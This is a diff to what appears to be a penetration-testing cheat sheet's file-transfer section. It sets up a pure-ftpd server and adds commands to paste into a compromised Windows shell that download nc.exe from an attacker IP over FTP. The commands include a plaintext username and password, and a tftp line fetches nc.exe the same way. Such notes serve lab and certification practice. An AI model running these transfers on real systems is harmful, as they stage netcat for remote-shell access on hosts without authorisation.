@@ -1066,12 +1066,13 @@ File Transfers
         C:\\Users\\Offsec>tftp -i $ip get nc.exe
 
     -   FTP  
-        apt-get update && apt-get install pure-ftpd  
-          
-        \#!/bin/bash  
+      
+         apt-get install pure-ftpd  
+         
+        #!/bin/bash  
         groupadd ftpgroup  
         useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
-        pure-pw useradd offsec -u ftpuser -d /ftphome  
+        pure-pw useradd ermolaev -u ftpuser -d /ftphome  
         pure-pw mkdb  
         cd /etc/pure-ftpd/auth/  
         ln -s ../conf/PureDB 60pdb  
@@ -1079,6 +1080,17 @@ File Transfers
         chown -R ftpuser:ftpgroup /ftphome/  
           
         /etc/init.d/pure-ftpd restart
+        
+        paste the following commands into a remote Windows shell
+        
+        echo open 10.11.0.183 21> ftp.txt
+        echo USER ermolaev>> ftp.txt
+        echo 1qaz@WSX>> ftp.txt
+        echo bin >> ftp.txt
+        echo GET nc.exe >> ftp.txt
+        echo bye >> ftp.txt
+        ftp -v -n -s:ftp.txt
+        
 
 -   Packing Files
     -------------------------------------------------------------------------------------------------------------
